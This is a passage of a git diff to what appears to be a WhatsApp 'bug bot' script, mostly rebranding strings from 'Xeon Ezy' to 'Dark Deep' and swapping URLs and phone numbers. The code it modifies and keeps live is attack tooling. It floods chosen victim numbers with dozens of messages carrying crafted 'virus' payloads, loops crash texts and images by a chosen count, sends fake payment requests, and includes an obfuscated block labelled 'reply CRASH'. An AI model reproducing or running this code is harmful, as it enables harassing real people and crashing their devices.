-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcgcinfinitexeon})
             break
 case 'gcbunny': {            
            	
@@ -7047,7 +7047,7 @@ case 'gcbunny': {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `ᴰᵃʳᵏ ᴰᵉᵉᵖ۝⸙bugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
@@ -7090,7 +7090,7 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcbunny 91xxxxxxxxxx`
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `ᴰᵃʳᵏ ᴰᵉᵉᵖ۝⸙bugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
@@ -7140,7 +7140,7 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcbunny 91xxxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `ᴰᵃʳᵏ ᴰᵉᵉᵖ۝⸙bugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
@@ -7173,8 +7173,8 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcbunny 91xxxxxxxxx
 if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-kwkwkx = '``🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot``',
-XeonBotInc.sendMessage(m.chat, {text: kwkwkx, thumbnail: xpicvirus, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Xeon Ezy☣️',previewType:"PHOTO",thumbnail: xpicvirus,sourceUrl:websitex}}})
+kwkwkx = '``ᴰᵃʳᵏ ᴰᵉᵉᵖ۝⸙bugbot``',
+XeonBotInc.sendMessage(m.chat, {text: kwkwkx, thumbnail: xpicvirus, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Dark Deep☣️',previewType:"PHOTO",thumbnail: xpicvirus,sourceUrl:websitex}}})
 }
 }
 break
@@ -7196,7 +7196,7 @@ case 'iosvirtex': {
 if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-XeonBotInc.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone}` }, { quoted: doc })
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://i.imgur.com/Eq8Vv8p.jpeg' }, caption: `${ownername} ${iphone}` }, { quoted: doc })
 }
 }
 break
@@ -7206,7 +7206,7 @@ case 'iosvirtex5': {
 if (args.length == 0) return m.reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-XeonBotInc.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone5}` }, { quoted: doc })
+XeonBotInc.sendMessage(m.chat, { image: { url: 'https://i.imgur.com/Eq8Vv8p.jpeg' }, caption: `${ownername} ${iphone5}` }, { quoted: doc })
 }
 }
 break
@@ -7217,7 +7217,7 @@ if (args.length == 0) return m.reply(`Amount?\nExample ${prefix+command} 5`)
 amount = `${encodeURI(q)}`
 ydd = `${botname}`
 for (let i = 0; i < amount; i++) {
-function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage',' 50767666664','771192XPifQJ',' 50767666664','${ownername}\x20🦄?','45FHicsI','2213460MCRxLU','AH\x20EZ','350069CkDHKE','reply\x20CRASH','https://chat.whatsapp.com/HYj9wu5Jrv6CROxyeQbHoS','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await XeonBotInc[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'JOIN\x20XEON\x20GROUP\x20CHAT','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'X\x20BUG\x20EZZZ','id':_0x47bf3a(0x153)}}]}));
+function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage',' 50767666664','771192XPifQJ',' 50767666664','${ownername}\x20🦄?','45FHicsI','2213460MCRxLU','AH\x20EZ','350069CkDHKE','reply\x20CRASH','https://chat.whatsapp.com/COzM9PfhGln9w89Vm1GG2W','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await XeonBotInc[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'JOIN\x20XEON\x20GROUP\x20CHAT','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'X\x20BUG\x20EZZZ','id':_0x47bf3a(0x153)}}]}));
  await sleep(20)
 }
 }
@@ -7332,7 +7332,7 @@ var xeonoporwot = generateWAMessageFromContent(m.chat, proto.Message.fromObject(
 "surface": "CATALOG",
 "message": ownername,
 "orderTitle": wm, // 
-"sellerJid": " 916909137213@s.whatsapp.net",
+"sellerJid": " 916291588399@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: m.chat, quoted: doc })
@@ -7353,7 +7353,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "INR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+"text": `ᴰᵃʳᵏ ᴰᵉᵉᵖ۝⸙bugbot`,
 }
 }}), { userJid: m.chat, quoted: doc})
 XeonBotInc.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -7433,7 +7433,7 @@ case 'huehuex': {
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-reply(`🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot ${m.pushName} ${text ? ': ' + text : ''}`)
+reply(`ᴰᵃʳᵏ ᴰᵉᵉᵖ۝⸙bugbot ${m.pushName} ${text ? ': ' + text : ''}`)
 }
 break
   case 'not_for_use_xxxxxxxxxxxxwkwkwk':{
@@ -7451,12 +7451,12 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`, 
+"caption": `ᴰᵃʳᵏ ᴰᵉᵉᵖ۝⸙bugbot`, 
 "jpegThumbnail": thumb
 } 
 } 
 }
-XeonBotInc.sendText(m.chat, `Xeon Ezy☣️`, text, {quoted: unicornXeonxD})
+XeonBotInc.sendText(m.chat, `Dark Deep☣️`, text, {quoted: unicornXeonxD})
 }
 }
 break
@@ -7466,7 +7466,7 @@ case 'textshot': {
                 let user = global.db.data.users[m.sender]
                 user.afkTime = + new Date
                 user.afkReason = text
-                reply(`${m.pushName} Xeon Ezy☣️${text ? ': ' + text : ''}`)
+                reply(`${m.pushName} Dark Deep☣️${text ? ': ' + text : ''}`)
             }
             break
 //------------------------The End----------------------\\
